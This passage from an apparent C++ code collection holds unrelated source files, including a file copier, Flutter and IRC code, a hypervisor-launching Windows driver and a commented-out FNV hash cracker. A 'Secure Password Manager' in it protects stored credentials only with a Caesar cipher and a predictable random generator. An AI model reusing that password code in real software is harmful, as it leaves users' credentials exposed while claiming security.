\u4e2d\u7684\u4f4d\u7f6e\u3002*/\n    std::size_t dotPos = __srcFile.find('.');\n\n    /*\u5728\u786e\u4fdd\u5b57\u7b26\u4e32 __srcFile \u6709 . \u5b57\u7b26\u7684\u60c5\u51b5\u4e0b */\n    if (dotPos != __srcFile.npos)\n    {\n        /*\u5206\u5272 . \u5b57\u7b26\u540e\u9762\u7684\u6240\u6709\u5b57\u7b26\uff0c\u5e76\u8fd4\u56de*/\n        return __srcFile.substr(dotPos + 1);\n    }\n    else { return \"\"; } // \u5728 __srcFile \u627e\u4e0d\u5230 . \u5b57\u7b26\u5c31\u8fd4\u56de\u7a7a\u5b57\u7b26\n}\n\nstd::string FileCopyOperator::getFileName(const std::string & __srcFile)\n{\n    // \u67e5\u627e\u6700\u540e\u4e00\u4e2a '/' \u6216 '\\' \uff08\u7531\u4e8e\u5df2\u4f7f\u7528 forwardBackwardSwitch \u7edf\u4e00\u8fc7\uff0c\u6b64\u5904\u53ef\u53ea\u67e5\u627e '/'\n    std::size_t pathPos = __srcFile.rfind(OS_SPECIFIC_SLASH);\n\n    // \u82e5\u627e\u4e0d\u5230 '/'\uff0c\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\n    if (pathPos == std::string::npos) { return \"\"; }\n\n    // \u5206\u5272\u6700\u540e\u4e00\u4e2a '/' \u540e\u9762\u7684\u6240\u6709\u5b57\u7b26\uff0c\u5e76\u8fd4\u56de\n    return __srcFile.substr(pathPos + 1);\n}\n\nvoid FileCopyOperator::copyFile(std::string __srcFile, std::string __tarPath)\n{\n    /*\u5c06\u4f20\u5165\u7684\u8def\u5f84\u5b57\u7b26\u4e32\u7684\u659c\u6760\u671d\u5411\u5168\u90e8\u6539\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u89c4\u8303\u7684\u659c\u6760*/\n    this->forwardBackwardSwitch(__srcFile);\n    this->forwardBackwardSwitch(__tarPath);\n\n    /*\u7531\u4e8e\u53ef\u80fd\u4f20\u5165\u7684\u975e\u6cd5\u5b57\u7b26\uff0c\u6240\u4ee5\u9700\u8981\u6709\u5f02\u5e38\u673a\u5236*/\n    try\n    {\n        /*\u6253\u5f00\u8981\u88ab\u590d\u5236\u7684\u6587\u4ef6*/\n        this->readFStream.open(__srcFile, std::ios_base::binary);\n\n        if (!this->readFStream.is_open()) \n        { \n            throw std::runtime_error(__srcFile + \" is not exist!\\n\");\n        }\n\n        /*\n            \u5c06\u8981\u88ab\u590d\u5236\u7684\u6587\u4ef6\u548c\u8981\u88ab\u590d\u5236\u5230\u7684\u8def\u5f84\u7ec4\u6210\u65b0\u7684\u6587\u4ef6\u8def\u5f84\uff0c\n            \u5982 ./data/The_Art_of_Patience.txt \u6216 .\\data\\The_Art_of_Patience.txt\n        */\n       std::string targetFile;\n        if (*(__tarPath.end() - 1) == OS_SPECIFIC_SLASH)\n        {\n            targetFile = (__tarPath + this->getFileName(__srcFile));\n        }\n        else \n        {\n            targetFile = (__tarPath + OS_SPECIFIC_SLASH + this->getFileName(__srcFile));\n        }\n\n        loger(\n                std::cout, NOTIFY,\n                \"Copy [\", __srcFile, \"] to [\", targetFile, \"]\\n\"\n        );\n\n        /*\u6253\u5f00 \u6216 \u521b\u5efa\uff08\u5728\u76ee\u6807\u6587\u4ef6\u4e0d\u5b58\u5728\u7684\u60c5\u51b5\u4e0b\uff09targetFile*/\n        this->writeFstream.open(targetFile, std::ios_base::out | std::ios_base::binary);\n\n        if (!this->writeFstream.is_open())\n        {\n            throw std::runtime_error(\"Failed to open the target file: \" + targetFile + '\\n');\n        }\n\n        /*\u5f53\u6ca1\u6709\u8bfb\u5230\u6e90\u6587\u4ef6\u672b\u5c3e\u65f6*/\n        while (!this->readFStream.eof())\n        {\n            /*\u4ece\u6e90\u6587\u4ef6\u6316 bufferSize \u5b57\u8282\u7684\u6570\u636e\u5230 byteBuffer*/\n            readFStream.read(reinterpret_cast<char *>(&this->byteBuffer), BUFFER_SIZE);\n\n            // \u786e\u5b9a\u4e00\u5171\u8bfb\u4e86\u591a\u5c11\u5b57\u8282\u7684\u6570\u636e\uff0c\u907f\u514d\u6587\u4ef6\u672c\u8eab\u6bd4\u7f13\u51b2\u533a\u8fd8\u5c0f\u7684\u60c5\u51b5\u3002\n            std::streamsize bytesRead = readFStream.gcount();\n\n            /*\u628a\u7f13\u51b2\u533a\u5185\u7684\u6570\u636e\u5168\u90e8\u5199\u5165\u76ee\u6807\u6587\u4ef6*/\n            writeFstream.write(reinterpret_cast<char *>(&this->byteBuffer), bytesRead);\n\n            /*\u5199\u5165\u5b57\u8282\u6570\u7d2f\u52a0*/\n            this->sourceFileByteCount += bytesRead;\n\n            if (readFStream.eof()) { break; }\n        }\n\n        loger(\n                std::cout, NOTIFY,\n                \"Size of [\", this->getFileName(__srcFile), \"] = \", \n                (double)this->sourceFileByteCount / 1024, \" KBytes.\\n\"\n        );\n    }\n    catch (const std::exception & __except)\n    {\n        ERROR_LOG(__except.what());\n    }\n}\n\nFileCopyOperator::~FileCopyOperator()\n{\n    this->readFStream.clear();\n    this->writeFstream.clear();\n    this->readFStream.close();\n    this->writeFstream.close();\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <algorithm>\r\n#include <cctype>\r\n#include <map>\r\n#include <sstream>\r\n#include <limits> \r\n#include <stdexcept> \r\n\r\nstd::string generateRandomPassword(int length) {\r\n    const std::string charset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+\";\r\n    std::string password;\r\n    std::srand(static_cast<unsigned int>(std::time(nullptr)));\r\n    for (int i = 0; i < length; ++i) {\r\n        password += charset[std::rand() % charset.size()];\r\n    }\r\n    return password;\r\n}\r\n\r\nstd::string encrypt(const std::string& text, int key) {\r\n    std::string result = text;\r\n    for (char& c : result) {\r\n        if (std::isalpha(c)) {\r\n            char base = std::isupper(c) ? 'A' : 'a';\r\n            c = (c - base + key) % 26 + base;\r\n        }\r\n    }\r\n    return result;\r\n}\r\n\r\nstd::string decrypt(const std::string& text, int key) {\r\n    return encrypt(text, 26 - key);\r\n}\r\n\r\nvoid storePassword(const std::string& site, const std::string& username, const std::string& password) {\r\n    std::ofstream file(\"C:\\\\mang.txt\", std::ios::app);\r\n    if (file.is_open()) {\r\n        std::string encryptedSite = encrypt(site, 3);\r\n        std::string encryptedUsername = encrypt(username, 3);\r\n        std::string encryptedPassword = encrypt(password, 3);\r\n        file << encryptedSite << \" \" << encryptedUsername << \" \" << encryptedPassword << std::endl;\r\n        std::cout << \"Password stored successfully.\" << std::endl;\r\n    }\r\n    else {\r\n        std::cerr << \"Error: Unable to open file for storing password.\" << std::endl;\r\n        system(\"cls\");\r\n    }\r\n}\r\n\r\nstd::map<std::string, std::pair<std::string, std::string>> retrievePasswords() {\r\n    std::ifstream file(\"C:\\\\mang.txt\");\r\n    std::map<std::string, std::pair<std::string, std::string>> passwords;\r\n    if (file.is_open()) {\r\n        std::string line;\r\n        while (std::getline(file, line)) {\r\n            std::istringstream iss(line);\r\n            std::string encryptedSite, encryptedUsername, encryptedPassword;\r\n            if (iss >> encryptedSite >> encryptedUsername >> encryptedPassword) {\r\n                std::string site = decrypt(encryptedSite, 3);\r\n                std::string username = decrypt(encryptedUsername, 3);\r\n                std::string password = decrypt(encryptedPassword, 3);\r\n                passwords[site] = std::make_pair(username, password);\r\n            }\r\n        }\r\n    }\r\n    else {\r\n        std::cerr << \"Error: Unable to open password file for retrieval.\" << std::endl;\r\n    }\r\n    return passwords;\r\n}\r\n\r\nvoid clearScreen() {\r\n#ifdef _WIN32\r\n    system(\"cls\");\r\n#else\r\n    system(\"clear\");\r\n#endif\r\n}\r\n\r\nint main() {\r\n    int choice;\r\n    std::map<std::string, std::pair<std::string, std::string>> passwords;\r\n    do {\r\n        clearScreen();\r\n        passwords = retrievePasswords();\r\n        std::cout << \"\\nSecure Password Manager\\n\";\r\n        std::cout << \"1. Store New Password\\n\";\r\n        std::cout << \"2. Retrieve Password\\n\";\r\n        std::cout << \"3. Generate Random Password\\n\";\r\n        std::cout << \"4. Exit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\r\n\r\n        switch (choice) {\r\n        case 1: {\r\n            std::string site, username, password;\r\n            std::cout << \"Enter website or service name: \";\r\n            std::getline(std::cin, site);\r\n            std::cout << \"Enter username: \";\r\n            std::getline(std::cin, username);\r\n            std::cout << \"Enter password: \";\r\n            std::getline(std::cin, password);\r\n            storePassword(site, username, password);\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 2: {\r\n            std::string site;\r\n            std::cout << \"Enter website or service name: \";\r\n            std::getline(std::cin, site);\r\n            auto it = passwords.find(site);\r\n            if (it != passwords.end()) {\r\n                std::cout << \"Username: \" << it->second.first << std::endl;\r\n                std::cout << \"Password: \" << it->second.second << std::endl;\r\n            }\r\n            else {\r\n                std::cout << \"Password not found for the given site.\" << std::endl;\r\n            }\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 3: {\r\n            int length;\r\n            std::cout << \"Enter password length: \";\r\n            std::cin >> length;\r\n            std::cout << \"Generated Password: \" << generateRandomPassword(length) << std::endl;\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 4:\r\n            std::cout << \"Exi",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"../../include/core/Executor.hpp\"\n#include \"../../include/core/Server.hpp\"\n\nvoid Executor::parseKICK(std::vector<std::string>& cmds, std::string& msg)\n{\n\tint size = msg.size();\n\tint argNum = 0;\n\tint i = 0;\n\n\t// \uacf5\ubc31 \uae30\uc900\uc73c\ub85c \uc55e\uc5d0 \uc778\uc790 3\uac1c \uad6c\ubd84\n\twhile (1)\n\t{\n\t\tif (argNum == 3 || i == size) break;\n\t\twhile (i < size && msg[i] == ' ')\n\t\t\ti++;\n\t\tstd::string cmd;\n\t\twhile (i < size && msg[i] != ' ')\n\t\t\tcmd += msg[i++];\n\t\tif (cmd.size() > 0)\n\t\t{\n\t\t\tcmds.push_back(cmd);\n\t\t\targNum++;\n\t\t}\n\t}\n\n\t// \uacf5\ubc31 \ub2e4 pass\n\twhile(i < size && msg[i] == ' ')\n\t\ti++;\n\n\t// ':'\uac00 \uc788\uc73c\uba74 index 1 \uc99d\uac00\n\tif (i < size && msg[i] == ':')\n\t\ti++;\n\t\n\t// \ub4a4\uc5d0 \ub0b4\uc6a9\uc774 \uc788\ub294\uacbd\uc6b0 \ud55c\ubc88\uc5d0 \ub2f4\uae30\n\tif (i < size)\n\t\tcmds.push_back(msg.substr(i));\n}\n\nvoid Executor::KICK(Client& client, std::vector<std::string>& cmds)\n{\n\t// \uc778\uc790 \uac1c\uc218 \uc624\ub958\n\tif (cmds.size() < 3)\n\t{\n\t\tclient.sendMsg(ServerMsg::NEEDMOREPARAMS(client.getNick(), cmds[0]));\n\t\treturn ;\n\t}\n\n\t// \uc5c6\ub294 \ucc44\ub110\n\tif (!Channel::isChannelInUse(cmds[1]))\n\t{\n\t\tclient.sendMsg(ServerMsg::NOSUCHCHANNEL(client.getNick(), cmds[1]));\n\t\treturn ;\n\t}\n\n\t// \uc5c6\ub294 \ub2c9\n\tif (!Client::isNicknameInUse(cmds[2]))\n\t{\n\t\tclient.sendMsg(ServerMsg::NOSUCHNICK(client.getNick(), cmds[2]));\n\t\treturn ;\n\t}\n\n\t// \ub0b4\uac00 \ucc44\ub110\uc5d0 \uc5c6\uc744\ub54c\n\tif (!client.isClientMemberOfChannel(cmds[1]))\n\t{ \n\t\tclient.sendMsg(ServerMsg::NOTONCHANNEL(client.getNick(), cmds[1]));\n\t\treturn ;\n\t}\n\n\t// kick \ud558\ub824\ub294 \uc0ac\ub78c\uc774 \ucc44\ub110\uc5d0 \uc5c6\uc744 \ub54c\n\tChannel& channel = Channel::getChannel(cmds[1]);\n\tif (!channel.doesClientExist(cmds[2]))\n\t{\n\t\tclient.sendMsg(ServerMsg::USERNOTINCHANNEL(client.getNick(), cmds[2], cmds[1]));\n\t\treturn ;\n\t}\n\n\t// client\uac00 operator \uad8c\ud55c\uc774 \uc5c6\uc744 \ub54c\n\tif (!channel.isOperator(client.getNick()))\n\t{\n\t\tclient.sendMsg(ServerMsg::CHANOPRIVSNEEDED(client.getNick(), cmds[1]));\n\t\treturn ;\n\t}\n\n\t// kick! \uba54\uc2dc\uc9c0 \uc804\uc1a1\n\tif (cmds.size() == 3)\n\t{\n\t\tchannel.sendToClients(ServerMsg::KICK(client.getNick(), client.getHostName(), client.getServerName(),\n\t\t\t\t\t\t\t\t\t\t\t\tchannel.getName(), cmds[2], \"\"));\n\t}\n\telse\n\t{\n\t\tchannel.sendToClients(ServerMsg::KICK(client.getNick(), client.getHostName(), client.getServerName(),\n\t\t\t\t\t\t\t\t\t\t\t\tchannel.getName(), cmds[2], cmds[3]));\n\t}\n\n\t// \ucc44\ub110 \ub9ac\uc2a4\ud2b8\uc5d0\uc11c \ud074\ub77c\uc774\uc5b8\ud2b8 \uc81c\uac70\n\tClient& beKickedClient = Client::getClient(cmds[2]);\n\tchannel.removeNickInChannel(beKickedClient);\n\n\t// \ud074\ub77c\uc774\uc5b8\ud2b8 \ucc44\ub110 \ub9ac\uc2a4\ud2b8\uc5d0\uc11c \ucc44\ub110 \uc81c\uac70\n\tbeKickedClient.removeJoinedChannels(&channel);\n\n\t// \ub9cc\uc57d \ucc44\ub110\uc5d0 \uc544\ubb34\ub3c4 \uc5c6\uc73c\uba74 \ucc44\ub110 \uc81c\uac70\n\tif (channel.getSize() == 0)\n\t\tChannel::removeChannel(channel.getName());\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"password_strength_validator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"../include/container_view.h\"\n#include <iostream>\n#include <vector>\n#include <deque>\n#include <list>\n#include <set>\n#include <map>\n#include <unordered_set>\n#include <unordered_map>\n#include <array>\n#include <tuple>\n#include <forward_list>\n\nint main() {\n    // Pair\n    std::pair<int, double> p = {1, 3.14};\n    std::cout << \"Pair: \" << p << std::endl;\n\n    // Tuple\n    std::tuple<int, char, double> t = {1, 'a', 2.3};\n    std::cout << \"Tuple: \" << t << std::endl;\n\n    // Array\n    std::array<int, 3> arr = {1, 2, 3};\n    std::cout << \"Array: \" << arr << std::endl;\n\n    // Deque\n    std::deque<double> dq = {1.1, 2.2, 3.3};\n    std::cout << \"Deque: \" << dq << std::endl;\n\n    // Forward List\n    std::forward_list<int> fl = {1, 2, 3};\n    std::cout << \"Forward List: \" << fl << std::endl;\n\n    // Initializer list (note: we cannot print directly, used only for example)\n    std::initializer_list<int> il = {1, 2, 3};\n\n    // List\n    std::list<int> lst = {1, 2, 3};\n    std::cout << \"List: \" << lst << std::endl;\n\n    // Vector\n    std::vector<std::string> vec = {\"hello\", \"world\"};\n    std::cout << \"Vector: \" << vec << std::endl;\n\n    // Set\n    std::set<std::string> set = {\"apple\", \"banana\", \"cherry\"};\n    std::cout << \"Set: \" << set << std::endl;\n\n    // Multiset\n    std::multiset<int> mset = {4, 5, 4, 1};\n    std::cout << \"Multiset: \" << mset << std::endl;\n\n    // Unordered Set\n    std::unordered_set<int> uset = {4, 5, 6, 7};\n    std::cout << \"Unordered Set: \" << uset << std::endl;\n\n    // Unordered Multiset\n    std::unordered_multiset<int> umset = {4, 5, 6, 6};\n    std::cout << \"Unordered Multiset: \" << umset << std::endl;\n\n    // Map\n    std::map<char, int> map = {{'a', 1}, {'b', 2}};\n    std::cout << \"Map: \" << map << std::endl;\n\n    // Multimap\n    std::multimap<char, int> mmap = {{'a', 1}, {'a', 2}};\n    std::cout << \"Multimap: \" << mmap << std::endl;\n\n    // Unordered Map\n    std::unordered_map<char, int> umap = {{'c', 3}, {'b', 2}};\n    std::cout << \"Unordered Map: \" << umap << std::endl;\n\n    // Unordered Multimap\n    std::unordered_multimap<char, int> ummap = {{'c', 3}, {'c', 4}};\n    std::cout << \"Unordered Multimap: \" << ummap << std::endl;\n\n    return 0;\n}\n",
    "/*\n*\n* This is just an old file I had for testing, it still has some code I want to port for multitheading\n* so it will not yet be deleted\n*\n*/\n\n\n/*\n#include \"fplll.h\"\n#include <iomanip>\n\n// changes a lot depending on what you're trying to crack\nconstexpr uint64_t OFFSET_BASIS = 0x79D6530B0BB9B5D1;\n\n// These are the only two primes COD uses (as far as I know)\nconstexpr uint64_t PRIME = 0x10000000233; // will crack 8 char plaintext with around 54% accuracy\n// constexpr uint64_t PRIME = 0x100000001B3; // will crack 8 char plaintext with around 93% accuracy\n\n// may occasionally change to 63\nconstexpr uint32_t BIT_LEN = 64;\nstatic_assert(BIT_LEN <= 64, \"The hard maximum on the BIT_LEN value is 64\");\n\nuint64_t fnv64(const char* string) {\n    uint64_t hash = OFFSET_BASIS;\n    constexpr uint64_t prime = PRIME;\n    for (int i = 0; string[i] && string[i] != '\\n'; ++i) {\n        char cur = string[i];\n        if ((unsigned char)(cur - 'A') <= 25)\n            cur |= 0x20;\n\n        if (cur == '\\\\')\n            cur = '/';\n\n        hash ^= cur;\n        hash *= prime;\n    }\n\n    if constexpr (BIT_LEN != 64) {\n        return hash % (1ULL << BIT_LEN);\n    } else {\n        return hash;\n    }\n}\n\nuint64_t fnv64(const string& string) {\n    uint64_t hash = OFFSET_BASIS;\n    constexpr uint64_t prime = PRIME;\n    for (const char& chr : string) {\n        char cur = chr;\n        if ((unsigned char)(cur - 'A') <= 25)\n            cur |= 0x20;\n\n        if (cur == '\\\\')\n            cur = '/';\n\n        hash ^= cur;\n        hash *= prime;\n    }\n\n    if constexpr (BIT_LEN != 64) {\n        return hash % (1ULL << BIT_LEN);\n    } else {\n        return hash;\n    }\n}\n\nstd::tuple<Z_NR<mpz_t>, Z_NR<mpz_t>, Z_NR<mpz_t>>\ngcd_extended(Z_NR<mpz_t> a, Z_NR<mpz_t> b) {\n    if (a == 0) {\n        Z_NR<mpz_t> ra, rb;\n        mpz_set_ui(ra.get_data(), 0UL);\n        mpz_set_ui(rb.get_data(), 1UL);\n        return make_tuple(b, ra, rb);\n    }\n\n    Z_NR<mpz_t> tmp_b, x;\n    tmp_b.mod(b, a);\n    auto [gcd, x1, y1] = gcd_extended(tmp_b, a);\n    mpz_div(b.get_data(), b.get_data(), a.get_data());\n    b.mul(b, x1);\n    x.sub(y1, b);\n    return make_tuple(gcd, x, x1);\n}\n\ntemplate <unsigned long long prime, uint32_t exp>\nuint64_t inverse() {\n    static once_flag flag{};\n    static uint64_t result;\n    call_once(flag, [&]() {\n        Z_NR<mpz_t> mpz_exp, mpz_prime, tmp;\n        mpz_ui_pow_ui(mpz_exp.get_data(), 2U, exp);\n        mpz_set_ui(mpz_prime.get_data(), prime);\n\n        auto ret = gcd_extended(mpz_prime, mpz_exp);\n        tmp.mod(std::get<1>(ret), mpz_exp);\n        result = mpz_get_ui(tmp.get_data());\n        if constexpr (exp != 64) {\n            result %= 1ULL << exp;\n        }\n    });\n\n    return result;\n}\n\nvector<string>& product(const string_view& chars, int repeat) {\n    static unordered_map<int, vector<string>> cache;\n    \n    auto it = cache.find(repeat);\n    if (it != cache.end())\n        return it->second;\n    \n    vector<string> result;\n    function<void(int, string)> generate = [&](int depth, string current) {\n        if (depth == 0) {\n            result.push_back(current);\n            return;\n        }\n        \n        for (const char c : chars)\n            generate(depth - 1, current + c);\n    };\n    \n    generate(repeat, \"\");\n    cache[repeat] = result;    \n    return cache[repeat];\n}\n\ninline Z_NR<mpz_t> pow(const Z_NR<mpz_t>& base, unsigned int exponent) {\n    Z_NR<mpz_t> result;\n    mpz_pow_ui(result.get_data(), base.get_data(), exponent);\n    return result;\n}\n\nbool solve(\n    string& result,\n    const uint64_t target,\n    const uint32_t expected_len,\n    const uint32_t brute = 0,\n    const string& prefix = \"\",\n    const string& suffix = \"\"\n) {\n    Z_NR<mpz_t> MOD, p;\n    mpz_ui_pow_ui(MOD.get_data(), 2U, BIT_LEN); // 2 ** BIT_LEN\n    mpz_set_ui(p.get_data(), PRIME);\n\n    // change according to whatever youre working with\n    const string valid_charset = valid_func;\n\n    const uint32_t nn = expected_len - brute - prefix.size() - suffix.size();\n    const uint32_t dim = nn + 2;\n\n    uint64_t P = 1;\n    for (int i = 0; i < nn; ++i)\n        P *= PRIME;\n    \n    if constexpr (BIT_LEN != 64) {\n        P %= 1ULL << BIT_LEN;\n    }\n\n    Z_NR<mpz_t> start;\n    mpz_set_ui(start.get_data(), 1ULL << 12); // 2 ** 12\n\n    ZZ_mat<mpz_t> Q(dim, dim);\n    Q(0, 0) = start;\n    for (int i = 1; i < dim - 1; ++i)\n        Q(i, i) = 1ULL << 4; // 2 ** 4\n    Q(dim - 1, dim - 1) = 1ULL << 10; // 2 ** 10\n\n    // identity matrix but with an extra column on the left and extra row on the bottom\n    ZZ_mat<mpz_t> _M(dim, dim);\n    for (int i = 0; i <= nn; ++i)\n        _M(i, i+1) = 1;\n\n    // fill in extra column on the left\n    // (except second to last val)\n    for (int i = 0; i < nn; ++i)\n        _M(i, 0) = pow(p, nn - i);\n    _M(dim - 1, 0) = MOD;\n\n    uint64_t ntarget = target;\n    for (int i = suffix.size() - 1; i >= 0; --i) {\n        ntarget *= inverse<PRIME, BIT_LEN>();\n        ntarget ^= suffix.at(i);\n    }\n\n    string ret = \"\";\n    if constexpr (BIT_LEN != 64) {\n   ",
    "// Company Tags                : Google\n// Leetcode Link               : https://leetcode.com/problems/find-the-maximum-sum-of-node-values/description/\n\n#include <iostream>\n#include <algorithm>\n#include <vector>\n#include <climits>\n\nusing namespace std;\n\nclass Solution {\npublic:\n    long long maximumValueSum(vector<int>& nums, int k, vector<vector<int>>& edges) {\n        long long sum = 0;\n        int count = 0;\n        int mini = INT_MAX;\n\n        for (long long num : nums) {\n            if ((num ^ k) > num) {\n                count++;\n                sum += (num ^ k);\n            } \n            else {\n                sum += num;\n            }\n\n            mini = min((long long)mini, abs(num - (num ^ k)));\n        }\n\n        return (count % 2 == 0) ? sum : sum - mini;\n    }\n};\n\nint main() {\n    vector<int> nums {7, 7, 7, 7, 7, 7};\n    int k = 3;\n    vector<vector<int>> edges {\n        {0, 1},\n        {0, 2},\n        {0, 3},\n        {0, 4},\n        {0, 5},\n    };\n\n    Solution obj;\n\n    cout << obj.maximumValueSum(nums, k, edges);\n    return 0;\n}\n\n",
    "#include \"vmxlaunch.hpp\"\n#include \"idt.hpp\"\n\nauto drv_entry(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path) -> NTSTATUS\n{\n\tUNREFERENCED_PARAMETER(registry_path);\n\n\t// setup vcpu structures (vmx on region and vmcs...)\n\tvmxon::create_vcpus(&vmxon::g_vmx_ctx);\n\n\tcr3 cr3_value;\n\tcr3_value.flags = __readcr3();\n\tcr3_value.pml4_pfn =\n\t\t(MmGetPhysicalAddress(mm::pml4).QuadPart >> 12);\n\n\tmemset(mm::pml4, NULL, sizeof mm::pml4);\n\tmm::pml4[PML4_SELF_REF].pfn = cr3_value.pml4_pfn;\n\tmm::pml4[PML4_SELF_REF].present = true;\n\tmm::pml4[PML4_SELF_REF].rw = true;\n\tmm::pml4[PML4_SELF_REF].user_supervisor = false;\n\n\tPHYSICAL_ADDRESS current_pml4;\n\tcurrent_pml4.QuadPart =\n\t\t(cr3{ __readcr3() }.pml4_pfn << 12);\n\n\tconst auto kernel_pml4 =\n\t\treinterpret_cast<mm::ppml4e>(\n\t\t\tMmGetVirtualForPhysical(current_pml4));\n\n\t// vmxroot will have the same \"address space\" as the current one being executed in...\n\tmemcpy(&mm::pml4[256], &kernel_pml4[256], sizeof(mm::pml4e) * 256);\n\n\t// setup mapping ptes to be present, writeable, executable, and user supervisor false...\n\tfor (auto idx = 0u; idx < 255; ++idx)\n\t{\n\t\treinterpret_cast<mm::ppte>(mm::pml4)[idx].present = true;\n\t\treinterpret_cast<mm::ppte>(mm::pml4)[idx].rw = true;\n\t}\n\n\t// setup IDT for host....\n\tsegment_descriptor_register_64 idt_value;\n\t__sidt(&idt_value);\n\n\t// copy the guest IDT entries...\n\tmemcpy(idt::table, (void*)idt_value.base_address, idt_value.limit);\n\n\tidt::table[general_protection] = \n\t\tidt::create_entry(hv::idt_addr_t\n\t\t\t{ __gp_handler }, idt::ist_idx::gp);\n\n\tidt::table[page_fault] = \n\t\tidt::create_entry(hv::idt_addr_t\n\t\t\t{ __pf_handler }, idt::ist_idx::pf);\n\n\tidt::table[divide_error] = \n\t\tidt::create_entry(hv::idt_addr_t\n\t\t\t{ __de_handler }, idt::ist_idx::de);\n\n\tidt::table[non_maskable_interrupt] = \n\t\tidt::create_entry(hv::idt_addr_t\n\t\t\t{ __nmi_handler }, idt::ist_idx::nmi);\n\n\t// used for SEH in vmxroot fault handler...\n\tidt::image_base = driver_object->DriverStart;\n\n\t// enable vmx operation on all cores...\n\tKeIpiGenericCall((PKIPI_BROADCAST_WORKER)&vmxon::init_vmxon, NULL);\n\n\t// setup VMCS for all logical cores...\n\tKeIpiGenericCall((PKIPI_BROADCAST_WORKER)&vmxlaunch::init_vmcs, cr3_value.flags);\n\n\t// vmxlaunch for all cores...\n\tKeIpiGenericCall((PKIPI_BROADCAST_WORKER)&vmxlaunch::launch, NULL);\n\treturn STATUS_SUCCESS;\n}",
    "#include \"srbd.hpp\"\n\n#include <proxsuite/proxqp/dense/dense.hpp>\n\nnamespace srbd {\n    using qp_t = proxsuite::proxqp::dense::QP<double>;\n    using qp_mat_t = proxsuite::proxqp::dense::Mat<double>;\n    using qp_vec_t = proxsuite::proxqp::dense::Vec<double>;\n\n    SingleRigidBodyDynamics::SingleRigidBodyDynamics(const SingleRigidBodyDynamics& other)\n    {\n        // TO-DO: This is not the best way to handle this!! BUT should be okay for now..\n        operator=(other);\n    }\n\n    SingleRigidBodyDynamics& SingleRigidBodyDynamics::operator=(const SingleRigidBodyDynamics& other)\n    {\n        // COM state\n        _base_position = other._base_position;\n        _base_vel = other._base_vel;\n        _base_orientation = other._base_orientation;\n        _base_angular_vel = other._base_angular_vel;\n\n        // Feet state\n        _feet_positions = other._feet_positions;\n        _feet_phases = other._feet_phases;\n\n        // Static ref poses/bounds\n        _feet_ref_positions = other._feet_ref_positions;\n        _feet_min_bounds = other._feet_min_bounds;\n        _feet_max_bounds = other._feet_max_bounds;\n\n        // Phase Handler\n        _phase_handler = 